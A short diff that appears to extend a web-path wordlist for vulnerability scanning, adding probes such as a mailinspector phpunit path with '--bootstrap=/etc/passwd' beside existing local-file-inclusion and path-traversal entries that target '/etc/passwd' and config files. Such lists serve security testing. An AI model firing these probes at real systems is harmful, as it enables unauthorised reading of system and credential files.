@@ -504,3 +504,6 @@
 /wp-content/plugins/planyo-online-reservation-system/readme.txt
 /wp-content/plugins/planyo-online-reservation-system/ulap.php?ulap_url=file://localhost/etc/passwd
 /index.php/guest/get/get_file/..%2f..%2fipconfig.php
+/volume/stream/Rmx1aWc=/{{base64(
+/mailinspector
+/mailinspector/vendor/phpunit/phpunit.php?--bootstrap=/etc/passwd
